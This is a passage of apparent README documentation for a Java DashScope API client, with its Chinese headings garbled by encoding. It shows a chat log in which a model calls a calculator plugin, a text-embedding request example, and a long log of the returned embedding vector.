2024-03-20 00:29:15 DEBUG dashscope://chat/qwen-plus <= {""output"":{""choices"":[{""finish_reason"":""stop"",""messages"":[{""role"":""assistant"",""plugin_call"":{""name"":""calculator"",""arguments"":""{\""payload__input__text\"": \""1+2*3-4/5\""}""},""content"":""""},{""role"":""plugin"",""name"":""calculator"",""content"":""{\""equations\"": [\""1 + 2 * 3 - 4 / 5\""], \""results\"": [6.2]}"",""status"":{""code"":200,""name"":""Success"",""message"":""success""}},{""role"":""assistant"",""content"":""The result of the expression \\(1 + 2 \\times 3 - \\frac{4}{5}\\) is approximately 6.2.""}]}]},""usage"":{""total_tokens"":103,""output_tokens"":93,""input_tokens"":10},""request_id"":""3659340f-7dad-9815-bd11-ce6c6eb4d1c2""}
```

### å‘é‡è®¡ç®—ç¤ºä¾‹

#### æ–‡æœ¬å‘é‡è®¡ç®—

```java
// è¯·æ±‚
final var request = EmbeddingRequest.newBuilder()
    .model(EmbeddingModel.TEXT_EMBEDDING_V2)
    .documents(List.of(
        ""æˆ‘çˆ±åŒ—äº¬å¤©å®‰é—¨"", 
        ""å¤©å®‰é—¨ä¸Šå¤ªé˜³å‡""
    ))
    .build();

// åº”ç­”
final var response = client.embedding(request)
    .async()
    .toCompletableFuture()
    .join();
```

è¾“å‡ºæ—¥å¿—

```text
2024-03-29 00:06:04 DEBUG dashscope://embedding/text-embedding-v2 => {""model"":""text-embedding-v2"",""input"":{""texts"":[""æˆ‘çˆ±åŒ—äº¬å¤©å®‰é—¨"",""å¤©å®‰é—¨ä¸Šå¤ªé˜³å‡""]},""parameters"":{}}
2024-03-29 00:06:05 DEBUG dashscope://embedding/text-embedding-v2 <= {""output"":{""embeddings"":[{""embedding"":[-0.04154389871036614,-0.006419809590355932,0.047459534772683644,-0.017466811782486734,0.012682765194211021,-0.008638173113724997,-0.01198812611113586,-0.010318751540519745,-0.011618398857241015,0.024491629606488773,0.009825781868659952,0.014195285778326293,-0.004310683664728525,0.009540083536104844,-0.009002298439530525,0.034126945920111985,0.00946725847094374,0.0031062691255256234,-0.007248894947574674,0.02547756895020836,-0.019539525175533586,0.03952720459821244,0.043605408247234356,-0.010492411311288535,-0.009175958210299316,0.021914742685403495,0.03372360709768125,-0.012133776241458071,0.025141453264849407,0.00010241024788280488,-0.018172654721740525,0.012593134344781967,0.0057531801477273495,-0.006128509329711509,0.07645511456298233,-0.004946502502865871,-0.021522607719151387,-0.015371690677082616,-0.038608488391564645,-0.04893844378826302,-0.0028121679008365425,0.021231307458506966,-0.023079943727981188,0.038675711528636435,0.0338132379471103,-0.000059389190759387267,-0.021455384582079597,-0.02420032934584435,0.015920679629835566,0.02684443940400142,0.01676096884323294,0.09608427058794498,0.0316172821360985,0.00848692105531347,-0.007316118084646463,-0.009344016052978792,0.005722369543236112,0.044255231905594994,-0.003896140986119154,0.019371467332854112,-0.038541265254492856,-0.013993616367110924,-0.018105431584668735,-0.03683827911534084,-0.013354996564928919,-0.004081004613066576,0.023886621372842663,-0.022676604905550447,-0.011797660556099121,0.0057755878600846125,0.0002751947173876398,-0.017545238775737153,0.025163860977206673,-0.015550952375940721,0.043851893083164256,0.0245364450312033,0.02256456634376413,-0.0218811311168676,-0.032401552068602714,0.0064254115184452475,-0.016189572178122724,0.0005696460625823027,0.046115072031247845,-0.0020951211054041174,0.011416729446025646,0.007915524390203257,0.010402780461859482,0.001632962038035562,0.021309734451757385,0.005240603727554951,-0.028278532994866268,0.0161447567534082,-0.005243404691599609,0.008542940336206629,0.03166209756081303,-0.06292085629919532,0.016604114856732095,-0.02263178948083592,0.003719680251305706,0.012021737679671754,-0.030160780832876384,-0.027292593651146686,0.0005973055825232995,-0.0012877432195314746,-0.000897008735301696,-0.024155513921129825,0.006083693904996983,-0.01192090297406407,0.00919836592265658,0.049521044309551863,0.008923871446280105,-0.010946167486523117,0.009579297032730055,0.00006661042618702095,0.031751728410242076,0.01185367983699228,0.017276346227449994,0.0006046581131405266,-0.03291692945281977,-0.0071256525296097255,-0.015069186560259561,0.01118144846627438,0.03990813570828591,-0.030608935080021653,-0.029152433776799536,-0.009321608340621528,0.044008747069665094,-0.05785671330645381,-0.00882303674067242,-0.03428379990661283,0.019113778640745583,-0.019909252429428433,0.03544900094919052,-0.04961067515898092,-0.029331695475657643,0.0056439425499856906,0.050148460255555236,0.010850934709004747,0.04320206942480362,0.023147166865052977,0.02420032934584435,-0.0038205149569133907,-0.016055125903979145,0.003453588667063204,-0.052837385738426834,0.008156407298043837,0.023752175098699084,0.012223407090887123,0.009125540857495474,-0.008077980304793415,0.019954067854142957,-0.05091032247570219,-0.020402222101288222,-0.018923313085708847,-0.009086327360870262,0.010912555917987222,0.009164754354120685,0.0005412863016301413,0.030071149983447332,-0.009624112457444583,-0.07107726359723915,0.031303574163096815,0.001981682061595472,0.003543219516492257,0.002997031527783965,-0.026889254828715944,0.009495268111390318,-0.037846626171417694,-0.009657724025980478,0.005344239397207294,0.018452751126206316,-0.026956477965787734,0.02487256071656225,0.0512688458734184,-0.0119321068302427,-0.006935186974572988,-0.04340373883601899,0.01431852819629124,0.0015153215481599298,0.03621086316933747,0.010010645495607373,0.0026217023457998046,-0.0009068121094579987,-0.030429673381163546,-0.02803204815893637,0.05588483461901464,-0.03524733153797515,0.018251081714990947,-0.015170021265867245,-0.03544900094919052,0.03289452174046251,-0.017758112043131154,-0.04992438313198261,0.053419986259715675,0.036569386567053684,0.003870932309717233,0.042193722368726774,0.04371744680902068,-0.017702092762237998,0.019685175305855798,-0.021477792294436863,-0.014251305059219451,-0.01921461334635327,0.0022197640053913943,0.000709344144309616,0.004428324154604158,0.014273712771576715,0.013668704537930605,-0.020301387395680538,-0.013881577805324606,-0.017623665768987575,-0.0006263655844866254,-0.010582042160717588,-0.012290630227958914,0.009937820430446269,0.017690888906059365,-0.009556889320372791,0.03222229036974461,-0.002870988145774359,-0.007086439032984514,0.02181390797979581,0.010245926475358639,0.0263066543074271,0.02015573726535833,-0.040580367079003817,-0.04499468641338468,0.010335557324787692,0.021511403862972758,-0.03320822971346419,-0.0014382950369318374,-0.03923590433756802,0.017343569364521784,0.02070472621811128,-0.01240266878974523,0.024245144770558877,-0.033409899124679565,-0.012290630227958914,0.007383341221718253,-0.015595767800655249,-0.008430901774420312,0.04750435019739817,-0.007332923868914411,-0.0005913535339284015,-0.011685621994312804,0.02778556332300648,-0.024424406469416984,-0.02467089130534688,-0.011629602713419646,0.003910145806342444,0.018172654721740525,-0.014565013032221137,-0.0032575211839371504,0.0148002940119724,-0.02413310620877256,-0.0025712849929959624,-0.02482774529184772,0.016391241589338097,-0.019124982496924216,-0.020357406676573698,0.018452751126206316,0.03114672017659597,-0.03486640042790168,0.0484006586916887,0.014755478587257875,-0.0061621208982474045,-0.00977536451585611,0.00022950399140915758,0.0075345932801297805,-0.00484006586916887,-0.01977480615528485,-0.01779172361166705,0.005178982518572477,0.004389110657978946,0.0386981192409937,0.024626075880632353,-0.026082577183854466,0.03479917729082989,-0.007232089163306726,-0.03535937009976147,-0.02160103471240181,-0.052434046915996096,0.017119492240949153,-0.0031258758738382285,0.00903591000806642,-0.00899669651144121,0.034126945920111985,-0.009461656542854423,-0.03966165087235602,0.020895191773148015,0.02173548098654539,0.013097307872820391,-0.007327321940825095,0.0012261220105490005,-0.016335222308444936,0.007814689684595571,0.04889362836354849,0.02079435706754033,0.0034479867389738883,0.008845444453029682,-0.0024396396828970405,-0.009461656542854423,0.018979332366602004,-0.01397120865475366,-0.008122795729507942,0.03500084670204526,-0.03385805337182483,-0.005263011439912215,-0.03939275832406886,0.027471855350004792,-0.04252983805408572,-0.005195788302840425,-0.00910313314513821,-0.017287550083628627,-0.002067111464957538,-0.01964035988114127,-0.003260322147981808,-0.026934070253430472,0.0010678675420258286,-0.02482774529184772,0.015943087342192828,-0.028816318091440588,0.037465695061344215,0.012156183953815333,0.014027227935646818,0.0008781022280002551,-0.03258081376746082,-0.038406818980349276,-0.01909137092838832,0.006722313707178986,-0.014677051594007454,-0.015898271917478304,-0.024648483592989618,-0.020525464519253172,0.00163576300208022,0.046025441181818796,-0.04004258198242949,-0.018239877858812318,-0.00014057338299126892,0.01273878447510418,0.03168450527317029,0.018564789687992633,0.020603891512503594,-0.005377850965743189,-0.03020559625759091,0.02868187181729701,0.0002687174880343683,0.023326428563911084,0.03910145806342444,0.01141112751793633,0.030228003969948174,0.0015405302245618511,0.020357406676573698,0.023124759152695712,0.0028527818794840823,0.03141561272488313,-0.02291188588530171,-0.021511403862972758,0.06991206255466145,-0.02271021647408634,-0.03031763481937723,-0.0034087732423486775,0.02467089130534688,-0.0256344229367092,0.005299423972492768,-0.04965549058369544,0.004658003206266106,-0.005324632648894689,-0.001445297447043482,-0.08963084942905315,-0.036502163429981895,-0.023214390002124767,-0.02720296280171763,0.031998213246171976,0.016391241589338097,-0.018363120276777264,0.01756764648809442,-0.022642993337014552,-0.018038208447596946,0.033163414288749665,-0.007478573999236622,0.021085657328184754,0.0067279156352683025,0.006078091976907667,-0.014553809176042506,-0.013119715585177655,-0.01756764648809442,0.01865442053742169,-0.019181001777817373,-0.012010533823493123,-0.011175846538185064,-0.028435386981367113,-0.016391241589338097,0.002071312911024525,0.018295897139705475,0.031034681614809653,-0.0028737891098190166,0.01141112751793633,0.018788866811565268,-0.005758782075816665,-0.021578627000044547,0.03004874227109007,-0.019853233148535272,-0.0296005880239448,-0.014878721005222823,-0.005949247630853403,0.015517340807404826,-0.028099271296008164,0.014441770614256189,-0.10576440232628272,0.004851269725347502,-0.001069968265059322,0.009898606933821058,0.022855866604408553,-0.0055235010960654005,0.002205759185168105,-0.019561932887890852,-0.00378130146028818,-0.05077587620155861,-0.0035124089120010206,0.03565067036040589,0.02446922189413151,-0.004677609954578711,0.009752956803498846,-0.007557000992487043,-0.040714813353147396,0.006627080929660617,0.00003549346625339946,-0.0014284916627755346,-0.013175734866070814,0.013724723818823763,0.008806230956404473,0.021780296411259916,-0.0006932386010528329,0.009327210268710844,-0.03591956290869305,0.0009719345234962951,0.01513640969733135,0.04031147453071666,-0.021040841903470227,-0.011018992551684221,0.0333874914123223,-0.03264803690453261,0.014957147998473244,-0.010184305266376164,-0.027023701102859524,0.051492922996991035,0.012850823036890495,0.01165201042577691,0.030788196778879756,0.006251751747676457,-0.10737775761600568,0.015080390416438192,0.012581930488603336,0.0013787745509828567,-0.027315001363503948,0.01887849766099432,-0.0070528274644486195,-0.006677498282464459,-0.00620693632296193,0.02370735967398456,0.019393875045211374,0.014957147998473244,-0.0018192261470053133,0.026709993129857838,-0.01267156133803239,-0.02964540344865933,0.019685175305855798,0.02841297926900985,0.018508770407099476,-0.023393651700982874,0.01915859406546011,-0.007164866026234936,0.022351693076370128,-0.01704106524769873,-0.02167946170565223,-0.018732847530672107,-0.043851893083164256,-0.015338079108546721,-0.02037981438893096,-0.017354773220700417,0.023595321112198243,0.011898495261706806,-0.012391464933566599,-0.02241891621344192,-0.021892334973046233,-0.018127839297026,-0.007019215895912725,0.03370119938532398,-0.03961683544764149,0.006526246224052933,0.036883094540055374,-0.0201109218406438,0.00009750856080465353,-0.03264803690453261,0.02271021647408634,0.010794915428111588,-0.000307755924406788,0.004380707765844973,-0.026149800320926255,0.016536891719660305,0.007741864619434466,0.011808864412277752,-0.04286595373944467,-0.017612461912808946,-0.027090924239931313,-0.02079435706754033,0.01240266878974523,0.02323679771448203,0.01322055029078534,0.052568493190139676,0.0038877380939851803,0.016604114856732095,0.03482158500318715,-0.033028968014606086,0.023752175098699084,-0.04140945243622256,-0.002676321144670634,-0.010906953989897905,0.027023701102859524,-0.04116296760029266,0.026799623979286893,0.006145315113979457,0.014912332573758718,0.051627369271134614,-0.02172427713036676,-0.016447260870231253,0.0026048965615318572,0.017534034919558524,0.0008185817420512745,0.014957147998473244,0.02181390797979581,-0.03551622408626231,0.018273489427348213,0.015170021265867245,-0.008274047787919469,-0.016615318712910727,-0.013265365715499867,-0.014508993751327979,-0.014195285778326293,0.009607306673176635,0.03695031767712716,-0.02133214216411465,-0.019248224914889166,-0.00034819484280153653,0.011864883693170911,-0.012369057221209335,-0.024558852743560563,0.015786233355691986,-0.01323175414696397,0.009338414124889475,-0.015304467540010826,0.02460366816827509,0.010262732259626586,0.019909252429428433,-0.010206712978733427,0.012055349248207649,-0.05068624535212956,0.012537115063888809,0.003680466754680495,0.036614201991768215,-0.0063301787409268786,-0.008173213082311784,-0.017511627207201258,-0.03690550225241263,-0.013590277544680184,0.026777216266929627,0.00722648723521741,-0.05037253737912787,-0.00661027514539267,0.009472860399033054,-0.026530731430999734,0.03222229036974461,-0.01826228557116958,-0.01226822251560165,0.0108341289247368,-0.025992946334425414,0.016548095575838938,0.02556719979963741,-0.00046846123646903564,-0.011685621994312804,0.02174668484272402,0.0063413825971055104,0.017085880672413258,-0.03627808630640926,-0.025522384374922883,-0.014329732052469872,0.03349952997410861,-0.011220661962899591,-0.001634362520057891,0.02814408672072269,-0.000595204859489806,0.008117193801418626,-0.013859170092967343,0.00154193070658418,0.021410569157365073,-0.026597954568071524,0.014587420744578401,-0.01867682824977895,0.031101904751881442,-0.009299200628264264,-0.022385304644906026,-0.013186938722249445,-0.04248502262937119,0.013399811989643446,0.01158478728870512,-0.04230576093051309,-0.006470226943159774,0.005008123711848345,0.03910145806342444,0.022452527781977816,0.026642769992786048,-0.013814354668252817,-0.014419362901898925,-0.03916868120049623,0.03318582200110693,0.013377404277286183,0.007512185567772518,0.01438575133336303,0.017164307665663677,0.0024382392008747114,0.014598624600757032,0.019561932887890852,-0.006290965244301668,0.010380372749502218,-0.042821138314730146,0.006711109851000355,-0.0015223239582715746,0.029466141749801222,-0.018643216681243056,-0.026799623979286893,-0.008559746120474577,0.01964035988114127,-0.013668704537930605,-0.00910313314513821,0.039706466297070545,-0.009836985724838583,-0.021511403862972758,0.000945325365072045,-0.008223630435115627,0.0012331244206606454,-0.027292593651146686,-0.01403843179182545,0.015898271917478304,-0.0010300545274229468,-0.0029438132109354644,0.0022225649694360525,0.0027281389794968055,-0.005943645702764087,0.008744609747421998,0.00950647196756895,0.00820682465084768,-0.018217470146455052,-0.02213881980897613,0.020760745499004436,0.008374882493527153,0.01848636269474221,-0.02290068202912308,0.00033839146864523385,0.01308610401664176,0.006212538251051247,0.006380596093730721,-0.010660469153968009,-0.022474935494335078,-0.006201334394872615,-0.025007006990705828,0.018665624393600318,-0.012862026893069128,-0.015248448259117668,0.00422385377934413,0.02146658843825823,-0.009114337001316843,0.03500084670204526,-0.006980002399287514,0.009047113864245053,-0.0148002940119724,-0.011786456699920489,0.00024000760657662474,0.003588034941206784,0.031236351026025025,0.04125259844972171,0.03811551871970485,-0.04255224576644298,-0.015506136951226195,0.0005297323249459274,-0.014352139764827136,0.026956477965787734,0.001987283989684788,-0.03831718813092022,0.009685733666427056,-0.04035628995543118,-0.014845109436686928,-0.06023193081632372,0.0030978662333916497,0.0316172821360985,0.03098986619009513,-0.009556889320372791,-0.0010132487431549994,0.011876087549349542,0.016312814596087674,-0.00006674172137661429,-0.027628709336505634,0.05158255384642009,-0.009932218502356953,0.01513640969733135,-0.008318863212633995,0.04696656510082385,0.005178982518572477,-0.048086950718687016,-0.005515098203931427,0.00489328418601737,-0.05212033894299441,-0.012503503495352914,-0.05350961710914473,-0.04559969464703079,-0.021769092555081283,-0.030967458477737863,-0.00977536451585611,0.018228674002633685,-0.0022071596671904337,0.030608935080021653,0.004803653336588318,-0.03907905035106717,-0.008234834291294258,-0.0667749828246446,-0.03934794289935433,-0.06139713185890141,-0.010128285985483007,-0.020323795108037803,0.00780348582841694,0.006862361909411882,-0.0071872737385922,-0.026485916006285207,0.026866847116358682,-0.0568259585380197,-0.033477122261751355,0.0137023161064665,-0.027763155610649213,0.012862026893069128,-0.03903423492635265,-0.009646520169801845,0.015326875252368088,-0.0010657668189923352,0.049252151761264705,-0.01350064669525113,0.011237467747167539,0.008010757167721625,0.001639964448147207,-0.020839172492254858,0.06368271851934226,0.01199932996731449,-0.0037841024243328377,-0.0014971152818696535,0.028525017830796164,0.006890371549858461,0.010486809383199219,-0.01465464388165019,-0.0022211644874137234,0.006257353675765773,0.00023493085924568228,-0.012503503495352914,-0.024043475359343508,0.01957313674406948,0.0510895841745603,0.026351469732141627,-0.0077866800441489924,0.03414935363246925,-0.008346872853080575,-0.029017987502655957,0.05951488402089129,0.0074617682149686745,0.03278248317867619,-0.009332812196800159,-0.0395496123105697,-0.005699961830878849,-0.04344855426073352,0.026665177705143314,0.001364769730759567,0.060276746241038244,0.048086950718687016,0.032020620958529235,-0.007153662170056305,-0.004686012846712685,0.02323679771448203,-0.009091929288959579,-0.01779172361166705,0.03269285232924714,-0.003996975691726839,-0.010453197814663324,0.010408382389948798,-0.019124982496924216,-0.036681425128840005,-0.011399923661757698,0.000722648723521741,0.020883987916969386,0.025791276923210045,-0.005842810997156402,0.025970538622068152,0.015427709957975773,-0.008374882493527153,-0.03383564565946756,-0.026889254828715944,-0.012660357481853757,0.007506583639683201,-0.0038821361658958648,0.0163576300208022,0.004226654743388788,-0.013926393230039134,-0.03773458760963137,-0.0016973842110626941,0.004601983925372948,0.020021290991214746,0.0013346593672794946,0.0020349003784439724,-0.011063807976398748,-0.04396393164495057,0.023684951961627294,0.017287550083628627,-0.01397120865475366,0.03388046108418209,0.028054455871293637,0.02114167660907791,-0.007669039554273361,0.01969637916203443,0.03459750787961452,0.042955584588873726,-0.03842922669270654,-0.017197919234199572,0.011159040753917117,-0.013668704537930605,0.03253599834274629,0.015102798128795456,-0.0057531801477273495,0.03278248317867619,0.03842922669270654,0.003946558338922997,-0.04503950183809921,-0.02384180594812814,0.03524733153797515,0.012391464933566599,-0.007579408704844307,0.008122795729507942,-0.005355443253385926,0.026015354046782676,0.048221396992830595,-0.0014957147998473244,-0.04557728693467353,0.050148460255555236,0.018027004591418316,-0.008901463733922841,0.017186715378020943,0.04212649923165498,-0.006442217302713195,0.03081060449123702,0.056108911742587274,-0.007512185567772518,-0.0008837041560895709,-0.0019088569964343662,-0.049521044309551863,0.0023696155817805927,-0.018318304852062737,0.02774074789829195,0.010212314906822744,-0.03141561272488313,0.014172878065969029,0.05857376010188623,-0.01630161073990904,-0.005579520376958558,-0.014520197607506611,0.008778221315957893,-0.021589830856223177,0.058349682978313604,0.005954849558942718,0.031751728410242076,0.0008059774038503139,0.07058429392537936,0.025007006990705828,-0.025880907772639097,-0.0004730128030416047,-0.0076074183452908865,-0.0036776657906358373,0.019113778640745583,-0.02249734320669234,0.01881127452392253,0.02296790516619487,-0.00930480255635358,-0.009921014646178321,-0.05557112664601296,0.014688255450186085,0.03134838958781134,-0.041050929038506344,0.00964091824171253,0.03813792643206212,-0.03504566212675978,-0.03990813570828591,-0.003361156853589493,-0.015494933095047564,0.02243012006962055,0.005960451487032035,0.043851893083164256,-0.0074617682149686745,0.016884211261197886,-0.0028527818794840823,-0.02964540344865933,-0.006358188381373458,-0.016133552897229567,0.004747634055695159,0.018553585831814004,-0.005938043774674771,0.03318582200110693,-0.001476108051534719,-0.03589715519633579,-0.010626857585432114,0.02079435706754033,-0.010817323140468852,-0.002983026707560675,0.04844547411640323,-0.0035152098760456783,0.0014368945549095083,0.0008017759577833271,0.006240547891497826,0.03748810277370148,0.004781245624231054,0.040087397407144024,-0.04575654863353163,-0.009142346641763421,-0.0012289229745936585,-0.021421773013543702,-0.04562210235938805,0.0012275224925713294,-0.03782421845906043,0.006044480408371772,0.016200776034301357,0.016133552897229567,-0.03004874227109007,0.024021067646986246,-0.006178926682515352,0.0026273042738891206,-0.009327210268710844,0.035336962387404205,-0.052568493190139676,0.03253599834274629,0.002425634862673751,-0.011943310686421332,-0.01787015060491747,0.005131366129813293,0.017466811782486734,0.013142123297534919,-0.010839730852826116,0.007036021680180672,0.00886225023729763,0.03455269245489999,-0.01472186701872198,0.001104980315617546,-0.03986332028357139,-0.007248894947574674,-0.0163576300208022,0.03948238917349791,-0.03755532591077327,-0.021096861184363387,0.0013752733459270342,-0.035157700688546095,-0.030564119655307125,0.002012492666086709,0.02399865993462898,-0.00009033109044021762,-0.01602151433544325,0.03208784409560103,0.009013502295709158,-0.054809264425866,-0.004251863419790709,-0.0029354103188014907,-0.04880399751411944,-0.0052574095118228985,0.049565859734266395,0.024155513921129825,0.006750323347625565,-0.005386253857877163,-0.0003277127932249756,-0.02012212569682243,-0.047056195950252906,-0.007809087756506256,0.05705003566159233,0.037779403034345904,0.006873565765590514,0.04781805817039986,0.015394098389439878,0.015875864205121038,0.00485407068939216,-0.005226598907331662,0.006711109851000355,-0.0016875808369063913,0.0012814410504309944,-0.01323175414696397,-0.015416506101797142,0.010094674416947112,0.07009132425351956,-0.020805560923718963,-0.029891888284589226,0.018116635440847368,-0.008061174520525467,0.04669767255253669,0.005363846145519899,-0.025387938100779304,0.015170021265867245,0.04125259844972171,-0.03170691298552755,0.01756764648809442,0.04140945243622256,0.025992946334425414,0.005120162273634661,0.015315671396189457,0.01465464388165019,0.029107618352085012,0.02201557739101118,-0.00402218436812876,0.009657724025980478,0.006335780669016195,-0.020480649094538644,-0.00301663827609657,-0.0014179880476080675,0.0074617682149686745,0.005576719412913901,0.013993616367110924,-0.06520644295963617,0.0231919822897675,0.013646296825573343,-0.03031763481937723,0.006699905994821723,0.03455269245489999,0.03986332028357139,0.05978377656917845,0.027023701102859524,-0.08165370382986742,0.015013167279366402,0.005803597500531192,0.052254785217137986,-0.002229567379547697,-0.03132598187545407,0.014116858785075872,-0.05377850965743189,-0.017153103809485048,-0.011573583432526489,-0.027315001363503948,0.14905610260051538,-0.00422385377934413,-0.006072490048818351,-0.0042462614917013934,0.04499468641338468,0.041812791258653295,0.0010482607937132233,-0.0036776657906358373,-0.01574141793097746,-0.04477060928981205,-0.009388831477693317,0.017141899953306415,0.00435830005348771,0.04452412445388215,-0.007837097396952835,0.019080167072209688,-0.015371690677082616,-0.012369057221209335,0.07833736240099246,-0.025858500060281835,0.03197580553381471,0.01084533278091543,-0.005086550705098766,0.003870932309717233,0.010117082129304374,0.02554479208728015,-0.02848020240608164,0.03289452174046251,0.0035768310850281524,0.011237467747167539,-0.055660757495442005,0.03466473101668631,-0.0000625840403728252,0.05055179907798598,-0.016178368321944095,-0.004879279365794081,0.03392527650889662,0.0015601369728744565,-0.018127839297026,-0.0007366535437450305,0.02794241730950732,0.025119045552492145,-0.07125652529609726,0.023729767386341822,0.001450899375132798,0.017903762173453366,0.0012891437015538035,0.021993169678653918,-0.010464401670841955,0.06991206255466145,-0.027292593651146686,-0.005164977698349188,0.05633298886615991,0.015394098389439878,0.0019606748312605378,0.016772172699411572,0.046294333730105955,0.020469445238360015,0.022441323925799183,-0.030855419915951546,0.005120162273634661,0.00048316629770348967,-0.004512353075943895,0.0013227552700896985,-0.0005822504007832632,0.020189348833894224,-0.013377404277286183,0.018643216681243056,0.013052492448105866,0.03728643336248611,0.026597954568071524,-0.015999106623085988,0.009808976084392004,-0.01039157660568085,-0.031303574163096815,0.001665173124549128,-0.0057531801477273495,-0.020211756546251486,-0.021634646280937704,0.02541034581313657,0.0006806342628518724,-0.017007453679162836,0.03159487442374124,-0.026261838882712572,0.006940788902662303,-0.008895861805833525,0.0064254115184452475,0.033028968014606086,-0.007271302659931937,-0.01704106524769873,0.013063696304284497,0.05382332508214642,0.010341159252877007,-0.02924206462622859,-0.016324018452266303,-0.0010615653729253484,0.011864883693170911,-0.029264472338585854,0.04434486275502405,-0.05229960064185251,-0.019315448051960955,0.04183519897101056,-0.01738838478923631,0.0011161841717961774,0.005747578219638033,0.008722202035064734,-0.00896868687099463,-0.004019383404084103,0.030720973641807967,-0.007820291612684887,0.007848301253131467,-0.024088290784058036,0.005394656750011137,-0.017970985310525156,0.009433646902407843,-0.01717551152184231,0.028816318091440588,-0.058349682978313604,0.015853456492763776,0.023124759152695712,0.0024592464312096457,0.017074676816234625,0.018923313085708847,0.00529662300844811,-0.002299591480664145,-0.00804436873625752,-0.012615542057139231,-0.007327321940825095,-0.02399865993462898,0.02227326608311971,-0.02283345889205129,-0.06386198021820037,-0.0402218436812876,0.023281613139196557,-0.01513640969733135,0.003966165087235602,0.006346984525194826,-0.05722929736045044,-0.046876934251394796,-0.03025041168230544,0.013982412510932291,0.00954568546419416,-0.030564119655307125,0.008722202035064734,-0.00892947337436942,0.01288443460542639,-0.010346761180966323,-0.0013745731049158699,-0.04102852132614908,-0.0209960264787557,0.03177413612259934,-0.042574653478800246,0.010934963630344484,0.01729875393980726,0.06471347328777638,0.015427709957975773,-0.006027674624103824,-0.044322455042666783,-0.01573021407479883,-0.003529214696268968,-0.0061621208982474045,0.007635427985737465,-0.018015800735239684,-0.014408159045720294,0.04403115478202236,-0.012660357481853757,0.013590277544680184,0.026261838882712572,-0.04893844378826302,-0.025791276923210045,-0.027897601884792792,0.017164307665663677,-0.01826228557116958,-0.00261469993568816,0.004798051408499001,-0.008733405891243367,-0.010738896147218431,-0.01765727733752347,-0.025612015224351938,-0.017545238775737153,-0.0008837041560895709,0.0349112158526162,-0.005206992159019056,-0.04889362836354849,-0.024984599278348566,0.022407712357263288,0.006862361909411882,0.020469445238360015,0.013511850551429762,-0.03435102304368462,0.0009803374156302689,-0.029690218873373857,0.03898941950163812,-0.002837376577238464,-0.0011546974274102239,0.054898895275295054,-0.01955072903171222,0.001305949485821751,0.052254785217137986,0.017702092762237998,0.03267044461688987,-0.013108511728999024,0.015338079108546721,-0.024424406469416984,-0.010049858992232584,0.004072601720932602,-0.0333874914123223,0.022374100788727393,0.009909810789999689,-0.035852339771621264,-0.017668481193702103,0.042955584588873726,-0.011506360295454699,0.009472860399033054,0.021085657328184754,-0.01560697165683388,-0.01315332715371355,-0.014766682443436506,0.02718055508936037,0.011366312093221803,-0.021836315692153073,0.013601481400858815,0.06435494989006016,0.009674529810248425,0.007024817824002041,0.034126945920111985,-0.01120945810672096,0.008122795729507942,0.00838048442161647,-0.07779957730441814,-0.0041622325703616556,-0.03529214696268968,-0.029936703709303753,0.002415831488517448,-0.02700129339050226,0.02774074789829195,0.03374601481003851,-0.03327545285053598,-0.014755478587257875,-0.02718055508936037,0.023886621372842663,0.02610498489621173,-0.027987232734221847,-0.06094897761175614,0.02119769588997107,0.018833682236279792,0.008806230956404473,-0.06601312060449764,0.016794580411768834,-0.013791946955895553,-0.02290068202912308,-0.001004145610009861,0.010677274938235956,0.018721643674493478,-0.021836315692153073,-0.012626745913317862,-0.003926951590610391,-0.002330402085155382,0.0013241557521120274,0.02547756895020836,-0.024177921633487087,0.021455384582079597,-0.03157246671138397,-0.022642993337014552,0.010649265297789378,-0.04571173320881711,-0.026732400842215103,0.005814801356709823,-0.05377850965743189,0.039504796885855176,-0.013545462119965657,-0.08057813363671879,-0.002799563562635582,0.041431860148579816,-0.03092264305302334,-0.003153885514284808,0.0320430286708865,-0.05991822284332203,0.03587474748397852,0.001319254065033876,0.046249518305391424,-0.042821138314730146,-0.011125429185381222,0.0018766459099208003,0.01799339302288242,0.02003249484739338,0.03150524357431218,0.01465464388165019,0.006800740700429408,0.00020236965222653408,0.002450843539075672,-0.0207831532113617,0.03345471454939409,0.01913618635310285,0.033678791672966724,-0.0005752479906716185,-0.05064142992741503,0.0011091817616845328,-0.019875640860892538,-0.002985827671605333,0.013713519962645132,-0.010951769414612431,0.004417120298425526,0.0006365190791485102,0.0025656830649066465,0.021981965822475285,-0.022799847323515397,-0.002425634862673751,-0.011226263890988908,0.01045879974275264,0.016267999171373147,-0.00459918296132829,0.030138373120519122,-0.003985771835548207,-0.002709932713206529,0.00592683991849614,-0.016010310479264617,0.01145034101456154,0.014262508915398082,0.020323795108037803,0.0064086057341773,0.011976922254957228,-0.006257353675765773,-0.02167946170565223,0.027404632212933,0.01519242897822451,0.0010314550094452756,0.02390902908519993,-0.006094897761175614,-0.03482158500318715,0.024177921633487087,0.019315448051960955,-0.02222845065840518,0.026351469732141627,0.021589830856223177,-0.002946614174980122,-0.0013759735869381987,-0.004576775248971027,0.01764607348134484,-0.04506190955045647,-0.013377404277286183,0.05633298886615991,-0.004579576213015684,-0.02003249484739338,0.002988628635649991,0.009484064255211687,-0.05382332508214642,0.019539525175533586,-0.04190242210808235,0.02181390797979581,-0.007730660763255835,0.029421326325086698,-0.02951095717451575,0.016312814596087674,0.04033388224307392,0.016704949562339783,-0.0014270911807532057,-0.0212088997461497,-0.04831102784225965,0.027964825021864582,-0.027763155610649213,0.0008423899364308667,-0.007842699325042151,0.0006564759479666979,0.016940230542091046,-0.0034479867389738883,0.0024382392008747114,0.030228003969948174,-0.026015354046782676,-0.01397120865475366,0.012918046173962285,-0.01969637916203443,0.058663390951315286,0.020872784060790753,-0.00977536451585611,-0.0015629379369191143,-0.021612238568580442,0.01001624742369669,-0.022441323925799183,-0.012895638461605023,-0.016099941328693673,0.013982412510932291,0.005534704952244032,0.032267105794459135,-0.012257018659423018,0.02711333195228858,0.06287604087448079,0.006453421158891827,0.025298307251350252,-0.01301888087956997,-0.02657554685571426,-0.04893844378826302,0.010542828664092377,0.04996919855669713,0.0023766179918922373,-0.03652457114233916,-0.02291188588530171,0.024558852743560563,0.030788196778879756,0.00698560432737683,0.00034364327622896746,-0.006559857792588828,-0.010413984318038113,0.005445074102814979,0.029197249201514064,0.017926169885810632,-0.023416059413340136,0.017410792501593574,-0.011562379576347856,0.0002358061605096379,-0.043291700274232674,0.006761527203804197,-0.005394656750011137,0.000050679943183029075,-0.019449894326104535,-0.02794241730950732,-0.01630161073990904,0.0012779398453751718,-0.000408940750520055,0.05606409631787274,0.010957371342701748,0.046115072031247845,-0.0017183914413976284,0.024850153004204987,0.006459023086981142,0.02814408672072269,0.011259875459524803,-0.021903538829224863,0.015237244402939035,0.03293933716517703,-0.01601031047926461